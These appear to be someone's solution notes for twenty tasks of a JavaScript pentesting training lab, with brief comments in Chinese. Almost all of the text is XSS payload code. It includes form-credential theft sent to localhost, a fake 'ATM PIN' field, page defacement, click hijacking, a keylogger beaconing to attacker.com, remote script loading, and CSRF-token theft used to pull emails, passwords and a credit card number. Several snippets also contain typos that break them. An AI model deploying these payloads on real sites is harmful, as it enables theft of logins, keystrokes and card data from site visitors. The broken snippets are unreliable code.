task 1 solution code:
<script>window.onload=function(){document.getElementsByTagName('h1')[0].innerHTML="Found me!";document.getElementsByTagName('h2')[2].innerHTML="Modified You"}</script>


task 2 solution code:
<script>
window.onload = function()
{
     tagA = document.getElementsByTagName('a');
     for (var index=0;index<tagA.length;index++)
     {
          tagA[index].href="http://www.pentesteracademy.com/topics";
     }
}
</script>

task 3
http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?url=aaa
solution task:
<script>
funtion Interception()
{
     email = document.forms[0].elements[0].value;
     password = document.forms[0].elements[1].value;

     new Image().src = "http://localhost:9000?email=" + email + "&password=" + password;
    
}
document.forms[0].onsubmit=Interception
</script>

task 4 
http://www.satya-weblog.com/2010/02/add-input-fields-dynamically-to-form-using-javascript.html (javascript php and so on)
http://www.cnblogs.com/samlin/archive/2009/03/28/javascript-appendchild-insertbefore-insertafter.html (form appendChild insertBefore insertAfter)
http://www.360doc.com/content/09/1015/18/19147_7323297.shtml (css 和 javascript style属性)
<script>
window.onload = function()
{
  var fieldx = document.createElement('input');
  fieldx.type = "text";
  fieldx.class = "input-block-level";
  fieldx.placeholder= "ATM PIN";
  fieldx.name = "ATM PIN";
  fieldx.style.fontSize = "16px";
  fieldx.style.height = "auto";
  fieldx.style.marginBottom = "15px";
  fieldx.style.paddingLeft = "7px";
  fieldx.style.paddingRight = "9px";
  document.forms[0].insertBefore(fieldx,document.forms[0].childNodes[6])
}
</script>

standard solution:
<script>
window.onload = function()
{
  var fieldx = document.createElement('input');
  fieldx.setAttribute("type","text");
  fieldx.setAttribute("class","input-block-level");
  fieldx.setAttribute("placeholder","ATM PIN");
  fieldx.setAttribute("name","atmpin");

  var child = document.forms[0].elements[0];
  document.forms[0].insertBefore(fieldx,child)
}
</script>
获取form child 元素方法 forms[0].elements[0] or forms[0].childNodes[6] 

task 5 solution:
<script>
window.onload = function()
{
  var form0 = document.forms[0];
  var tag = document.createElement("h2");
  tag.innerHTML = "Server is down, Please visit XXX.net";
  form0.parentNode.appendChild(tag);
  form0.parentNode.removeChild(form0);
}
</script>

task 6 solution:

<script>
window.onclick = function(){
  window.location = "http://www.baidu.com";
}
</script>


<script>
function CatchClick() {
  location.href = "http://www.baidu.com";
}

document.body.addEventListener('click',CatchClick,true);

</script>

task 7 solution:
http://www.symantec.com/connect/blogs/getting-sassy-xss-part-1-keystroke-logging
<script>
document.onpress = function KeyLogger(inp)
{
  key_pressed = String.fromCharCode(inp.which);
  new Image().src = "http://attacker.com/?" + key_pressed;
}
</script>
与window.setInterval ()和在一起用，效果更好;

task 8 solution:
" onmouseover="

document.forms[0].onsubmit = function()
{
  var pass = document.forms[0].elements[1].value;
  alert(pass);
}

相当于劫持了onmouseover

task 9 solution:

<script src="http://demofilespa.s3.amazonaws.com/jfptest.js"></script>

window.addEventListener("load", function() { alert(document.cookie);});


task 10 solution:
1)
</script><script src="http://demofilespa.s3.amazonaws.com/jfptest.js">alert(1)

2)
var newtag = document.createElement("script");
newtag.type = "text/javascript";
newtag.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
document.body.appendChild(newtag);

task 11 solution:

<script>
document.getElementsByTagName("img")[0].src = "http://secfile.qiniudn.com/images.jpg";
</script>

task 12 solution:

elements 集合可返回包含表单中所有元素的数组。
元素在数组中出现的顺序和它们在表单的HTML 源代码中出现的顺序相同。
每个元素都有一个 type 属性，其字符串值说明了元素的类型。

<script type="text/javascript">
function getCookie(c_name)
{
if (document.cookie.length>0)
  {
  c_start=document.cookie.indexOf(c_name + "=")
  if (c_start!=-1)
    {
    c_start=c_start + c_name.length+1
    c_end=document.cookie.indexOf(";",c_start)
    if (c_end==-1) c_end=document.cookie.length
    return unescape(document.cookie.substring(c_start,c_end))
    }
  }
return ""
}

function setCookie(c_name,value,expiredays)
{
var exdate=new Date()
exdate.setDate(exdate.getDate()+expiredays)
document.cookie=c_name+ "=" +escape(value)+
((expiredays==null) ? "" : ";expires="+exdate.toGMTString())
}

function checkCookie()
{
username=getCookie('email');
password=getCookie("password");
if (username!=null && username!="" && password!=null && password!="")
  {
    document.forms[0].elements[0].value = username;
    document.forms[0].elements[1].value = password;

  }
}

if (document.forms[0].elements[2].checked)
{
  setCookie("email",document.forms[0].elements[0]);
  setCookie("password",documnet.forms[0].elements[1]);
}

document.body.onload = checkCookie;

document.forms[0][3].onsubmit = function(){
  alert("Get Cookie");
}

</script>

<script>
window.setTimeout(function(){
  document.forms[0].action = "http:localhost:9000";
  document.forms[0].submit();
},10000)
</script>
task 13 solution:

<script>
username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){
  
  var xhr = new XMLHttpRequest();
  xhr.open("GET","http:localhost:9000",true);
  xhr.send();

},10000)
</script>

task 14 solution:

<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange=function()
  {
  if (xhr.readyState==4 && xhr.status==200)
    {
    document.getElementById("result").innerHTML=xhr.responseText;
    }
  };
xhr.open("GET","/lab/webapp/jfp/14?name=john",true);
xhr.send();
</script>

task 15 solution:

<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange=function()
  {
  if (xhr.readyState==4 && xhr.status==200)
    {
     var result=xhr.responseText;
     alert(result);
    }
  };
xhr.open("POST","/lab/webapp/jfp/15/cardstore",true);
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xhr.send("user=john");
</script>

http://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp
task 16 solution:

携带token： token is dynamic and so we need to extract it take it

<script>
var xhr = XMLHttpRequest();
xhr.onreadystatechange = function()
{
 if (xhr.readyState==4 && xhr.status==200)
 {
      document.getElementById('result').innerHTML = xhr.responseText;
 }
};
token = window.location.search.split('&')[1];
xhr.open("GET","/lab/webapp/jfp/16/email?name=john&"+token,true);
xhr.send();
</script>

task 17 solution:

<script>
var xhr = XMLHttpRequest();
xhr.onreadystatechange = function()
{
 if (xhr.readyState==4 && xhr.status==200)
 {
      document.getElementById('result').innerHTML = xhr.responseText;
 }
};
uid = document.getElementById('uid').innerHTML.split(':')[1];
csrf_token = document.getElementById('csrf').innerHTML.split(':')[1];
xhr.open("GET","/lab/webapp/jfp/17/email?uid="+uid+"&csrf_token="+csrf_token,true);
xhr.send();
</script>

task 18 solution:

note:https://developer.mozilla.org/en-US/docs/HTML_in_XMLHttpRequest
<script>
var xhr = XMLHttpRequest();
xhr.onreadystatechange = function()
{
 if (xhr.readyState==4 && xhr.status==200)
 {
      var html = xhr.responseXML;
      var address = html.getElementById('address').innerHTML;
      document.getElementById('result').innerHTML = address;
 }
};
xhr.open("GET","/lab/webapp/jfp/18/address",true);
xhr.responseType = "document";
xhr.send();
</script>

task 19: http://pentesteracademylab.appspot.com/lab/webapp/jfp/19?url=www
<script>
var xhr1 = XMLHttpRequest();
var xhr2 = XMLHttpRequest();
var uid = '';
var csrf_token = '';
xhr2.onreadystatechange = function()
{
 if (xhr2.readyState==4 && xhr2.status==200)
 {
      var html = xhr2.responseXML;
      var result = html.getElementById('result').innerHTML;
      document.getElementById('result').innerHTML = result;
      var img = new Image();
      img.src = "http://localhost:8008/?creditcard=" + result;
 }
};

xhr1.onreadystatechange = function()
{
 if (xhr1.readyState==4 && xhr1.status==200)
 {
      var html = xhr1.responseXML;
      var form = html.forms[0];
      csrf_token = form.elements[1].value;
      alert(csrf_token);
      xhr2.open("GET","http://pentesteracademylab.appspot.com/lab/webapp/jfp/19/getcreditcard?uid=" + uid + "&csrf_token=" + csrf_token,true);
      xhr2.responseType = 'document';
      xhr2.send()
 }
};
link = document.getElementById('settings');
uid = link.innerHTML.split(':')[1];
xhr1.open("GET",link.href,true);
xhr1.responseType = "document";
xhr1.send();


</script>



task 20 solution:

https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
<script>

 var xhr1 = XMLHttpRequest();
 var xhr2 = XMLHttpRequest();
 uid = '';
 xhr2.onreadystatechange = function()
 {
  if (xhr2.readyState==4 && xhr2.status==200)
  {
      var json = JSON.parse(xhr2.responseText);
      var passwd = json.resp.password;
      document.getElementById('result').innerHTML = passwd;
  }
 };
 xhr1.onreadystatechange = function()
 {
  if (xhr1.readyState==4 && xhr1.status==200)
  {
    var json = JSON.parse(xhr1.responseText);
    var token = json.params.token;
    xhr2.open('GET','/lab/webapp/jfp/20/getpassword?token='+ token,true);
    xhr2.send();
  }

 };
 link = document.getElementById('settings');
 uid = link.innerHTML.split(':')[1];
 xhr1.open('GET','/lab/webapp/jfp/20/gettoken?uid='+ uid,true);
 xhr1.send();

</script>

